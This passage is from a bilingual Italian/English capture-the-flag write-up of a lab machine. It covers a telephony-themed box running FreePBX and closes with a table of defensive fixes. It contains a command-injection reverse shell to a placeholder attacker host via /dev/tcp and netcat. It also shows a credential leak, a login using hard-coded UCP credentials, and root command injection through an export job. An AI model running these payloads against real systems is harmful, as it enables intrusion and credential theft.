+<span class="neutral">     --data-urlencode 'host=127.0.0.1; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1"'</span>
+<span class="ok">web@infinity-pool:~$</span>   # shell interattiva come web</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># optional but handy: a reverse shell as web (steps [03]-[08] run on the box)</span>
+<span class="comment"># on YOUR box, listening:</span>
+<span class="neutral">nc -lvnp 4444</span>
+<span class="comment"># then inject the callback into the netcheck (swap &lt;attacker&gt; for your tun0 IP):</span>
+<span class="neutral">curl -s http://&lt;target&gt;/internal/netcheck \</span>
+<span class="neutral">     --data-urlencode 'host=127.0.0.1; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1"'</span>
+<span class="ok">web@infinity-pool:~$</span>   # interactive shell as web</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// se il callback non arriva" data-en="// if the callback never lands">// se il callback non arriva</div>
+  <p data-it="Non è il payload: su alcune VPN THM è il &lt;code&gt;ufw&lt;/code&gt; &lt;em&gt;della tua macchina&lt;/em&gt; a droppare l'inbound — sblocca con &lt;code&gt;sudo ufw allow in on tun0 to any port 4444 proto tcp&lt;/code&gt;. In alternativa, tutto il runbook si può eseguire senza reverse shell, incollando ogni comando nel canale di injection: &lt;code&gt;--data-urlencode 'host=127.0.0.1; &amp;lt;comando&amp;gt;'&lt;/code&gt; e ripulendo l'HTML con &lt;code&gt;sed 's/&amp;lt;[^&amp;gt;]*&amp;gt;//g'&lt;/code&gt;." data-en="It's not the payload: on some THM VPNs it's &lt;em&gt;your own&lt;/em&gt; &lt;code&gt;ufw&lt;/code&gt; dropping the inbound — open it with &lt;code&gt;sudo ufw allow in on tun0 to any port 4444 proto tcp&lt;/code&gt;. Otherwise the whole runbook also works with no reverse shell, pasting each command into the injection channel: &lt;code&gt;--data-urlencode 'host=127.0.0.1; &amp;lt;command&amp;gt;'&lt;/code&gt; and stripping HTML with &lt;code&gt;sed 's/&amp;lt;[^&amp;gt;]*&amp;gt;//g'&lt;/code&gt;.">Non è il payload: su alcune VPN THM è il <code>ufw</code> <em>della tua macchina</em> a droppare l'inbound — sblocca con <code>sudo ufw allow in on tun0 to any port 4444 proto tcp</code>. In alternativa, tutto il runbook si può eseguire senza reverse shell, incollando ogni comando nel canale di injection: <code>--data-urlencode 'host=127.0.0.1; &lt;comando&gt;'</code> e ripulendo l'HTML con <code>sed 's/&lt;[^&gt;]*&gt;//g'</code>.</p>
+</div>
+
+    <h2 data-it="[03] Ricognizione interna: i servizi in loopback" data-en="[03] Internal recon: the loopback services" id='loopback'>[03] Ricognizione interna: i servizi in loopback</h2>
+    <p data-it="Con una shell sul box, la prima mossa è guardare cosa ascolta &lt;strong&gt;solo&lt;/strong&gt; in locale — è lì che la macchina nasconde la catena. Tre servizi oltre all'edge: una console su &lt;code&gt;:3000&lt;/code&gt;, un'automazione su &lt;code&gt;:9000&lt;/code&gt;, e un Apache/FreePBX su &lt;code&gt;:8080&lt;/code&gt;." data-en="With a shell on the box, the first move is to look at what listens &lt;strong&gt;only&lt;/strong&gt; locally — that's where the box hides its chain. Three services beyond the edge: a console on &lt;code&gt;:3000&lt;/code&gt;, an automation on &lt;code&gt;:9000&lt;/code&gt;, and an Apache/FreePBX on &lt;code&gt;:8080&lt;/code&gt;.">Con una shell sul box, la prima mossa è guardare cosa ascolta <strong>solo</strong> in locale — è lì che la macchina nasconde la catena. Tre servizi oltre all'edge: una console su <code>:3000</code>, un'automazione su <code>:9000</code>, e un Apache/FreePBX su <code>:8080</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># porte in ascolto (tutte in loopback tranne l'edge :80)</span>
+<span class="neutral">ss -ltnp</span>
+<span class="neutral">127.0.0.1:3000   # cc-watchtower  (utente svc-watch)</span>
+<span class="neutral">127.0.0.1:9000   # cc-automation  (utente ROOT)</span>
+<span class="neutral">127.0.0.1:8080   # apache2 / FreePBX</span>
+<span class="neutral"></span>
+<span class="comment"># chi gira come cosa</span>
+<span class="neutral">ps -eo user,cmd | grep -E 'gunicorn|automation|watchtower' | grep -v grep</span>
+<span class="warn">root ... /var/www/infinity_pool/automation/venv/bin/gunicorn --bind 127.0.0.1:9000</span>   # :9000 e ROOT</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># listening ports (all loopback except the :80 edge)</span>
+<span class="neutral">ss -ltnp</span>
+<span class="neutral">127.0.0.1:3000   # cc-watchtower  (user svc-watch)</span>
+<span class="neutral">127.0.0.1:9000   # cc-automation  (user ROOT)</span>
+<span class="neutral">127.0.0.1:8080   # apache2 / FreePBX</span>
+<span class="neutral"></span>
+<span class="comment"># who runs as what</span>
+<span class="neutral">ps -eo user,cmd | grep -E 'gunicorn|automation|watchtower' | grep -v grep</span>
+<span class="warn">root ... /var/www/infinity_pool/automation/venv/bin/gunicorn --bind 127.0.0.1:9000</span>   # :9000 is ROOT</pre>
+</div></div>
+
+    <h2 data-it="[04] La console che perde le credenziali" data-en="[04] The console that leaks credentials" id='watchtower'>[04] La console che perde le credenziali</h2>
+    <p data-it="La console di sorveglianza (&lt;code&gt;cc-watchtower&lt;/code&gt;, utente &lt;code&gt;svc-watch&lt;/code&gt;) è di sola lettura: espone &lt;code&gt;/api/health&lt;/code&gt; e &lt;code&gt;/api/config&lt;/code&gt;. Ma il config dice più di quanto dovrebbe — comprese le credenziali del portale telefonico e l'endpoint dell'automazione." data-en="The surveillance console (&lt;code&gt;cc-watchtower&lt;/code&gt;, user &lt;code&gt;svc-watch&lt;/code&gt;) is read-only: it exposes &lt;code&gt;/api/health&lt;/code&gt; and &lt;code&gt;/api/config&lt;/code&gt;. But the config says more than it should — including the telephony portal credentials and the automation endpoint.">La console di sorveglianza (<code>cc-watchtower</code>, utente <code>svc-watch</code>) è di sola lettura: espone <code>/api/health</code> e <code>/api/config</code>. Ma il config dice più di quanto dovrebbe — comprese le credenziali del portale telefonico e l'endpoint dell'automazione.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s http://127.0.0.1:3000/api/config | python3 -m json.tool</span>
+<span class="danger">"telephony_user": "FreePBXUCPTemplateCreator",</span>
+<span class="danger">"telephony_pass": "St4yN0t1c3d_████",</span>        # mascherata: policy
+<span class="neutral">"telephony_portal": "http://127.0.0.1:8080/ucp",</span>
+<span class="neutral">"automation_endpoint": "http://127.0.0.1:9000",</span>
+<span class="neutral">"ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE."</span>
+<span class="neutral"></span>
+<span class="comment"># l'automazione: /jobs/export vuole un Bearer token che ancora non ho</span>
+<span class="neutral">curl -s http://127.0.0.1:9000/health | python3 -m json.tool | grep -A2 jobs</span>
+<span class="warn">"POST /jobs/export": {"auth": "Authorization: Bearer &lt;automation key&gt;"}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s http://127.0.0.1:3000/api/config | python3 -m json.tool</span>
+<span class="danger">"telephony_user": "FreePBXUCPTemplateCreator",</span>
+<span class="danger">"telephony_pass": "St4yN0t1c3d_████",</span>        # masked: policy
+<span class="neutral">"telephony_portal": "http://127.0.0.1:8080/ucp",</span>
+<span class="neutral">"automation_endpoint": "http://127.0.0.1:9000",</span>
+<span class="neutral">"ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE."</span>
+<span class="neutral"></span>
+<span class="comment"># the automation: /jobs/export wants a Bearer token I don't have yet</span>
+<span class="neutral">curl -s http://127.0.0.1:9000/health | python3 -m json.tool | grep -A2 jobs</span>
+<span class="warn">"POST /jobs/export": {"auth": "Authorization: Bearer &lt;automation key&gt;"}</span></pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// leggi le note lasciate dall'ops" data-en="// read the notes the ops left behind">// leggi le note lasciate dall'ops</div>
+  <p data-it="L'&lt;code&gt;ops_note&lt;/code&gt; non è colore: è il cartello che indica la strada. «UCP ancora sui creds di default del template» significa &lt;strong&gt;quella&lt;/strong&gt; è la porta. La password trapelata, invece, è un depistaggio parziale — non funziona su &lt;code&gt;su&lt;/code&gt;, SSH, MySQL o l'AMI di Asterisk (vedi sotto)." data-en="The &lt;code&gt;ops_note&lt;/code&gt; isn't flavour: it's the signpost. &quot;UCP still on default template creds&quot; means &lt;strong&gt;that&lt;/strong&gt; is the door. The leaked password, on the other hand, is a partial red herring — it fails on &lt;code&gt;su&lt;/code&gt;, SSH, MySQL and the Asterisk AMI (see below).">L'<code>ops_note</code> non è colore: è il cartello che indica la strada. «UCP ancora sui creds di default del template» significa <strong>quella</strong> è la porta. La password trapelata, invece, è un depistaggio parziale — non funziona su <code>su</code>, SSH, MySQL o l'AMI di Asterisk (vedi sotto).</p>
+</div>
+
+    <h2 data-it="[05] Vicoli ciechi (per non perderci tempo)" data-en="[05] Dead ends (so you don't waste time)" id='dead-ends'>[05] Vicoli ciechi (per non perderci tempo)</h2>
+    <p data-it="Prima di seguire la pista giusta, ecco cosa &lt;strong&gt;non&lt;/strong&gt; paga — testato, così tu non lo ripeti. La macchina è costruita per spingerti verso l'UCP, non verso il riuso di credenziali o una priv-esc locale classica." data-en="Before following the right lead, here's what does &lt;strong&gt;not&lt;/strong&gt; pay off — tested, so you don't repeat it. The box is built to push you toward UCP, not toward credential reuse or a classic local priv-esc.">Prima di seguire la pista giusta, ecco cosa <strong>non</strong> paga — testato, così tu non lo ripeti. La macchina è costruita per spingerti verso l'UCP, non verso il riuso di credenziali o una priv-esc locale classica.</p>
+    <table>
+      <thead><tr><th data-it="Tentativo" data-en="Attempt">Tentativo</th><th data-it="Esito" data-en="Result">Esito</th></tr></thead>
+      <tbody>
+        <tr><td data-it="&lt;code&gt;sudo -l&lt;/code&gt; come web" data-en="&lt;code&gt;sudo -l&lt;/code&gt; as web"><code>sudo -l</code> come web</td><td class="ok" data-it="chiede la password di web, che non ho" data-en="asks for web's password, which I don't have">chiede la password di web, che non ho</td></tr>
+        <tr><td data-it="Riuso password (su / SSH / MySQL / Asterisk AMI)" data-en="Password reuse (su / SSH / MySQL / Asterisk AMI)">Riuso password (su / SSH / MySQL / Asterisk AMI)</td><td class="ok" data-it="fallisce ovunque" data-en="fails everywhere">fallisce ovunque</td></tr>
+        <tr><td data-it="SUID / capabilities (&lt;code&gt;find / -perm -4000&lt;/code&gt;)" data-en="SUID / capabilities (&lt;code&gt;find / -perm -4000&lt;/code&gt;)">SUID / capabilities (<code>find / -perm -4000</code>)</td><td class="ok" data-it="solo binari standard, niente di utile" data-en="standard binaries only, nothing useful">solo binari standard, niente di utile</td></tr>
+        <tr><td data-it="Leggere &lt;code&gt;/etc/freepbx.conf&lt;/code&gt; per i creds DB" data-en="Read &lt;code&gt;/etc/freepbx.conf&lt;/code&gt; for the DB creds">Leggere <code>/etc/freepbx.conf</code> per i creds DB</td><td class="ok" data-it="permesso negato (root:asterisk 640)" data-en="permission denied (root:asterisk 640)">permesso negato (root:asterisk 640)</td></tr>
+        <tr><td data-it="&lt;code&gt;/proc/&amp;lt;pid&amp;gt;/environ&lt;/code&gt; dell'automazione per la key" data-en="&lt;code&gt;/proc/&amp;lt;pid&amp;gt;/environ&lt;/code&gt; of the automation for the key"><code>/proc/&lt;pid&gt;/environ</code> dell'automazione per la key</td><td class="ok" data-it="negato (processo di root)" data-en="denied (root process)">negato (processo di root)</td></tr>
+        <tr><td data-it="&lt;code&gt;automation.env&lt;/code&gt; / dir del servizio" data-en="&lt;code&gt;automation.env&lt;/code&gt; / service dir"><code>automation.env</code> / dir del servizio</td><td class="ok" data-it="dir 750 root:root: web non entra" data-en="dir 750 root:root: web can't enter">dir 750 root:root: web non entra</td></tr>
+      </tbody>
+    </table>
+
+    <h2 data-it="[06] FreePBX UCP: CVE-2026-46376 e il login AJAX" data-en="[06] FreePBX UCP: CVE-2026-46376 and the AJAX login" id='ucp-login'>[06] FreePBX UCP: CVE-2026-46376 e il login AJAX</h2>
+    <p data-it="La &lt;code&gt;:8080&lt;/code&gt; è FreePBX 16.0.45. L'utente &lt;code&gt;FreePBXUCPTemplateCreator&lt;/code&gt; è il tell della &lt;strong&gt;CVE-2026-46376&lt;/strong&gt;: credenziali hard-coded nel template generico dell'UCP che ti fanno entrare dritto nel User Control Panel. Il problema pratico: il login via &lt;code&gt;curl&lt;/code&gt; rimbalza sempre alla pagina di login — perché &lt;strong&gt;non&lt;/strong&gt; è il form-POST che sembra. Il form è decorativo; il vero login è una chiamata AJAX a &lt;code&gt;ucp/ajax.php&lt;/code&gt; con &lt;code&gt;module=User&amp;amp;command=login&lt;/code&gt;." data-en="The &lt;code&gt;:8080&lt;/code&gt; is FreePBX 16.0.45. The &lt;code&gt;FreePBXUCPTemplateCreator&lt;/code&gt; user is the tell for &lt;strong&gt;CVE-2026-46376&lt;/strong&gt;: credentials hard-coded into the generic UCP template that log you straight into the User Control Panel. The practical snag: logging in with &lt;code&gt;curl&lt;/code&gt; keeps bouncing back to the login page — because it's &lt;strong&gt;not&lt;/strong&gt; the form-POST it looks like. The form is decorative; the real login is an AJAX call to &lt;code&gt;ucp/ajax.php&lt;/code&gt; with &lt;code&gt;module=User&amp;amp;command=login&lt;/code&gt;.">La <code>:8080</code> è FreePBX 16.0.45. L'utente <code>FreePBXUCPTemplateCreator</code> è il tell della <strong>CVE-2026-46376</strong>: credenziali hard-coded nel template generico dell'UCP che ti fanno entrare dritto nel User Control Panel. Il problema pratico: il login via <code>curl</code> rimbalza sempre alla pagina di login — perché <strong>non</strong> è il form-POST che sembra. Il form è decorativo; il vero login è una chiamata AJAX a <code>ucp/ajax.php</code> con <code>module=User&amp;command=login</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">U=http://127.0.0.1:8080/ucp</span>
+<span class="neutral"></span>
+<span class="comment"># la password l'ha gia rivelata /api/config: la catturo (niente segreti da incollare)</span>
+<span class="neutral">PASS=$(curl -s http://127.0.0.1:3000/api/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["telephony_pass"])')</span>
+<span class="neutral"></span>
+<span class="comment"># 1) cookie di sessione + token CSRF (estrazione robusta all'ordine degli attributi)</span>
+<span class="neutral">curl -s -c cj $U/ &gt; login.html</span>
+<span class="neutral">TOK=$(grep -oiE 'name="token"[^&gt;]*value="[^"]+"|value="[^"]+"[^&gt;]*name="token"' login.html | grep -oE 'value="[^"]+"' | head -1 | sed 's/value="//;s/"//')</span>
+<span class="neutral">[ -n "$TOK" ] || echo 'CSRF token non trovato -- controlla login.html'</span>
+<span class="neutral"></span>
+<span class="comment"># 2) login VERO: POST all'endpoint AJAX (non al form)</span>
+<span class="neutral">curl -s -b cj -c cj $U/ajax.php \</span>
+<span class="neutral">     --data-urlencode "token=$TOK" \</span>
+<span class="neutral">     --data-urlencode 'username=FreePBXUCPTemplateCreator' \</span>
+<span class="neutral">     --data-urlencode "password=$PASS" \</span>
+<span class="neutral">     --data-urlencode 'module=User' --data-urlencode 'command=login'</span>
+<span class="ok">{"status":true,"message":"","token":"..."}</span>   # sessione autenticata in cj</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">U=http://127.0.0.1:8080/ucp</span>
+<span class="neutral"></span>
+<span class="comment"># the password was already revealed by /api/config: capture it (no secrets to paste)</span>
+<span class="neutral">PASS=$(curl -s http://127.0.0.1:3000/api/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["telephony_pass"])')</span>
+<span class="neutral"></span>
+<span class="comment"># 1) session cookie + CSRF token (extraction robust to attribute order)</span>
+<span class="neutral">curl -s -c cj $U/ &gt; login.html</span>
+<span class="neutral">TOK=$(grep -oiE 'name="token"[^&gt;]*value="[^"]+"|value="[^"]+"[^&gt;]*name="token"' login.html | grep -oE 'value="[^"]+"' | head -1 | sed 's/value="//;s/"//')</span>
+<span class="neutral">[ -n "$TOK" ] || echo 'CSRF token not found -- check login.html'</span>
+<span class="neutral"></span>
+<span class="comment"># 2) the REAL login: POST to the AJAX endpoint (not the form)</span>
+<span class="neutral">curl -s -b cj -c cj $U/ajax.php \</span>
+<span class="neutral">     --data-urlencode "token=$TOK" \</span>
+<span class="neutral">     --data-urlencode 'username=FreePBXUCPTemplateCreator' \</span>
+<span class="neutral">     --data-urlencode "password=$PASS" \</span>
+<span class="neutral">     --data-urlencode 'module=User' --data-urlencode 'command=login'</span>
+<span class="ok">{"status":true,"message":"","token":"..."}</span>   # authenticated session in cj</pre>
+</div></div>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// perche curl basta (niente browser)" data-en="// why curl is enough (no browser)">// perche curl basta (niente browser)</div>
+  <p data-it="Il writeup «da manuale» tunnella le porte con &lt;code&gt;chisel&lt;/code&gt; e usa un &lt;strong&gt;browser&lt;/strong&gt; perché il login gira in JavaScript. Ma il JS non fa magie: serializza il form e lo POSTa a &lt;code&gt;ajax.php&lt;/code&gt; con &lt;code&gt;module=User&amp;amp;command=login&lt;/code&gt;. Replicata la chiamata, &lt;code&gt;curl&lt;/code&gt; entra da solo — più veloce e senza tunnel. Se preferisci il browser, va benissimo lo stesso: &lt;code&gt;./chisel client &amp;lt;attacker&amp;gt;:9999 R:8080:127.0.0.1:8080&lt;/code&gt; e naviga su &lt;code&gt;http://127.0.0.1:8080/ucp/&lt;/code&gt;." data-en="The &quot;by-the-book&quot; writeup tunnels the ports with &lt;code&gt;chisel&lt;/code&gt; and uses a &lt;strong&gt;browser&lt;/strong&gt; because the login runs in JavaScript. But the JS does nothing magic: it serialises the form and POSTs it to &lt;code&gt;ajax.php&lt;/code&gt; with &lt;code&gt;module=User&amp;amp;command=login&lt;/code&gt;. Replicate that call and &lt;code&gt;curl&lt;/code&gt; logs in on its own — faster and tunnel-free. If you prefer the browser, that's fine too: &lt;code&gt;./chisel client &amp;lt;attacker&amp;gt;:9999 R:8080:127.0.0.1:8080&lt;/code&gt; and browse to &lt;code&gt;http://127.0.0.1:8080/ucp/&lt;/code&gt;.">Il writeup «da manuale» tunnella le porte con <code>chisel</code> e usa un <strong>browser</strong> perché il login gira in JavaScript. Ma il JS non fa magie: serializza il form e lo POSTa a <code>ajax.php</code> con <code>module=User&amp;command=login</code>. Replicata la chiamata, <code>curl</code> entra da solo — più veloce e senza tunnel. Se preferisci il browser, va benissimo lo stesso: <code>./chisel client &lt;attacker&gt;:9999 R:8080:127.0.0.1:8080</code> e naviga su <code>http://127.0.0.1:8080/ucp/</code>.</p>
+</div>
+
+    <h2 data-it="[07] La chiave è in segreteria" data-en="[07] The key is in a voicemail" id='voicemail'>[07] La chiave è in segreteria</h2>
+    <p data-it="Dentro l'UCP, l'utente ha un'estensione (&lt;code&gt;9919988&lt;/code&gt;) e una casella vocale. Il modulo Voicemail espone un comando &lt;code&gt;grid&lt;/code&gt; che restituisce i messaggi in JSON — &lt;strong&gt;Caller ID compreso&lt;/strong&gt;. E il Caller ID del messaggio nell'INBOX &lt;em&gt;è&lt;/em&gt; il Bearer token dell'automazione. Un tocco di classe, per una macchina a tema telefonia." data-en="Inside UCP, the user has an extension (&lt;code&gt;9919988&lt;/code&gt;) and a mailbox. The Voicemail module exposes a &lt;code&gt;grid&lt;/code&gt; command that returns messages as JSON — &lt;strong&gt;Caller ID included&lt;/strong&gt;. And the Caller ID of the INBOX message &lt;em&gt;is&lt;/em&gt; the automation Bearer token. A nice touch, for a telephony-themed box.">Dentro l'UCP, l'utente ha un'estensione (<code>9919988</code>) e una casella vocale. Il modulo Voicemail espone un comando <code>grid</code> che restituisce i messaggi in JSON — <strong>Caller ID compreso</strong>. E il Caller ID del messaggio nell'INBOX <em>è</em> il Bearer token dell'automazione. Un tocco di classe, per una macchina a tema telefonia.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># stessa sessione (cj): elenca i messaggi dell'estensione 9919988</span>
+<span class="neutral">curl -s -b cj "$U/ajax.php?module=voicemail&amp;command=grid\</span>
+<span class="neutral">&amp;ext=9919988&amp;folder=INBOX&amp;order=desc&amp;sort=date&amp;offset=0&amp;limit=100" \</span>
+<span class="neutral">  | python3 -m json.tool | grep -i callerid</span>
+<span class="ok">"callerid": "\"Automation Key cc_auto_████\" &lt;9000&gt;"</span>   # ecco il Bearer token</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># same session (cj): list extension 9919988's messages</span>
+<span class="neutral">curl -s -b cj "$U/ajax.php?module=voicemail&amp;command=grid\</span>
+<span class="neutral">&amp;ext=9919988&amp;folder=INBOX&amp;order=desc&amp;sort=date&amp;offset=0&amp;limit=100" \</span>
+<span class="neutral">  | python3 -m json.tool | grep -i callerid</span>
+<span class="ok">"callerid": "\"Automation Key cc_auto_████\" &lt;9000&gt;"</span>   # there's the Bearer token</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// perche curl legge la segreteria e web no" data-en="// why curl reads the voicemail and web can't">// perche curl legge la segreteria e web no</div>
+  <p data-it="Lo spool in &lt;code&gt;/var/spool/asterisk/voicemail/...&lt;/code&gt; è di proprietà di &lt;code&gt;asterisk&lt;/code&gt; e &lt;code&gt;web&lt;/code&gt; non lo legge. Ma l'UCP gira dentro Apache &lt;em&gt;come&lt;/em&gt; &lt;code&gt;asterisk&lt;/code&gt;: autenticato, glielo chiedi e te lo serve. È il classico «confused deputy» — non serve leggere il file, basta chiederlo a chi può." data-en="The spool in &lt;code&gt;/var/spool/asterisk/voicemail/...&lt;/code&gt; is owned by &lt;code&gt;asterisk&lt;/code&gt; and &lt;code&gt;web&lt;/code&gt; can't read it. But UCP runs inside Apache &lt;em&gt;as&lt;/em&gt; &lt;code&gt;asterisk&lt;/code&gt;: once authenticated, you ask and it serves it. A textbook &quot;confused deputy&quot; — you don't read the file, you ask someone who can.">Lo spool in <code>/var/spool/asterisk/voicemail/...</code> è di proprietà di <code>asterisk</code> e <code>web</code> non lo legge. Ma l'UCP gira dentro Apache <em>come</em> <code>asterisk</code>: autenticato, glielo chiedi e te lo serve. È il classico «confused deputy» — non serve leggere il file, basta chiederlo a chi può.</p>
+</div>
+
+    <h2 data-it="[08] Root via il job di export" data-en="[08] Root via the export job" id='root'>[08] Root via il job di export</h2>
+    <p data-it="Ho il Bearer token, e l'automazione gira come root. &lt;code&gt;/jobs/export&lt;/code&gt; accetta un JSON &lt;code&gt;{&quot;report&quot;:&quot;...&quot;}&lt;/code&gt;. Provo con un nome innocuo: la risposta &lt;strong&gt;ci consegna il gioco&lt;/strong&gt;, perché fa l'echo del comando che costruisce." data-en="I have the Bearer token, and the automation runs as root. &lt;code&gt;/jobs/export&lt;/code&gt; takes a JSON &lt;code&gt;{&quot;report&quot;:&quot;...&quot;}&lt;/code&gt;. I try a harmless name: the response &lt;strong&gt;hands us the game&lt;/strong&gt;, because it echoes the command it builds.">Ho il Bearer token, e l'automazione gira come root. <code>/jobs/export</code> accetta un JSON <code>{"report":"..."}</code>. Provo con un nome innocuo: la risposta <strong>ci consegna il gioco</strong>, perché fa l'echo del comando che costruisce.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># cattura il Bearer token dal Caller ID della segreteria (niente segreti da incollare)</span>
+<span class="neutral">K=$(curl -s -b cj "$U/ajax.php?module=voicemail&amp;command=grid&amp;ext=9919988&amp;folder=INBOX&amp;order=desc&amp;sort=date&amp;offset=0&amp;limit=100" | grep -oE 'cc_auto_[a-f0-9]+' | head -1)</span>
+<span class="neutral"></span>
+<span class="comment"># 1) prova innocua: guarda il comando che costruisce</span>
+<span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"test"}'</span>
+<span class="warn">"command": "tar czf /var/automation/exports/test.tgz /var/automation/data 2&gt;&amp;1"</span>
+<span class="neutral"></span>
+<span class="comment"># 2) il mio report finisce dritto nel comando: chiudo il tar, appendo id, # commenta il resto</span>
+<span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"x.tgz /var/automation/data; id #"}'</span>
+<span class="ok">"output": "uid=0(root) gid=0(root) groups=0(root) ..."</span>   # esecuzione come ROOT</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># capture the Bearer token from the voicemail Caller ID (no secrets to paste)</span>
+<span class="neutral">K=$(curl -s -b cj "$U/ajax.php?module=voicemail&amp;command=grid&amp;ext=9919988&amp;folder=INBOX&amp;order=desc&amp;sort=date&amp;offset=0&amp;limit=100" | grep -oE 'cc_auto_[a-f0-9]+' | head -1)</span>
+<span class="neutral"></span>
+<span class="comment"># 1) harmless probe: look at the command it builds</span>
+<span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"test"}'</span>
+<span class="warn">"command": "tar czf /var/automation/exports/test.tgz /var/automation/data 2&gt;&amp;1"</span>
+<span class="neutral"></span>
+<span class="comment"># 2) my report lands straight in the command: close the tar, append id, # comments out the rest</span>
+<span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"x.tgz /var/automation/data; id #"}'</span>
+<span class="ok">"output": "uid=0(root) gid=0(root) groups=0(root) ..."</span>   # execution as ROOT</pre>
+</div></div>
+    <p data-it="Stesso schema, cambio solo il comando: leggo la root flag." data-en="Same shape, just change the command: I read the root flag.">Stesso schema, cambio solo il comando: leggo la root flag.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'</span>
+THM{<span class="redaction">████████████████████</span>}   # oscurata: policy</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s -X POST http://127.0.0.1:9000/jobs/export \</span>
+<span class="neutral">     -H "Authorization: Bearer $K" -H 'Content-Type: application/json' \</span>
+<span class="neutral">     -d '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'</span>
+THM{<span class="redaction">████████████████████</span>}   # redacted: policy</pre>
+</div></div>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+
+    <h2 data-it="[09] Difesa" data-en="[09] Defence" id='defence'>[09] Difesa</h2>
+    <table>
+      <thead><tr><th data-it="Debolezza" data-en="Weakness">Debolezza</th><th data-it="Correzione" data-en="Fix">Correzione</th></tr></thead>
+      <tbody>
+        <tr><td data-it="&lt;code&gt;shell=True&lt;/code&gt; con input utente nel netcheck" data-en="&lt;code&gt;shell=True&lt;/code&gt; with user input in the netcheck"><code>shell=True</code> con input utente nel netcheck</td><td class="ok" data-it="niente shell: &lt;code&gt;subprocess.run([&quot;ping&quot;,&quot;-c&quot;,&quot;1&quot;,host])&lt;/code&gt; e validazione dell'host (allowlist / &lt;code&gt;ipaddress&lt;/code&gt;)" data-en="no shell: &lt;code&gt;subprocess.run([&quot;ping&quot;,&quot;-c&quot;,&quot;1&quot;,host])&lt;/code&gt; and validate the host (allowlist / &lt;code&gt;ipaddress&lt;/code&gt;)">niente shell: <code>subprocess.run(["ping","-c","1",host])</code> e validazione dell'host (allowlist / <code>ipaddress</code>)</td></tr>
+        <tr><td data-it="La console perde credenziali su &lt;code&gt;/api/config&lt;/code&gt;" data-en="The console leaks credentials on &lt;code&gt;/api/config&lt;/code&gt;">La console perde credenziali su <code>/api/config</code></td><td class="ok" data-it="mai restituire segreti in chiaro; separare config da secret, e ruotare i default" data-en="never return secrets in clear; split config from secrets, and rotate defaults">mai restituire segreti in chiaro; separare config da secret, e ruotare i default</td></tr>
+        <tr><td data-it="Credenziali UCP hard-coded (CVE-2026-46376)" data-en="Hard-coded UCP creds (CVE-2026-46376)">Credenziali UCP hard-coded (CVE-2026-46376)</td><td class="ok" data-it="patchare FreePBX, forzare il cambio password al primo accesso, rimuovere gli utenti template" data-en="patch FreePBX, force a password change on first login, remove template users">patchare FreePBX, forzare il cambio password al primo accesso, rimuovere gli utenti template</td></tr>
+        <tr><td data-it="Bearer token consegnato via Caller ID / segreteria" data-en="Bearer token delivered via Caller ID / voicemail">Bearer token consegnato via Caller ID / segreteria</td><td class="ok" data-it="i segreti non transitano nei metadati telefonici; token effimeri e legati al servizio" data-en="secrets don't ride in telephony metadata; ephemeral, service-bound tokens">i segreti non transitano nei metadati telefonici; token effimeri e legati al servizio</td></tr>
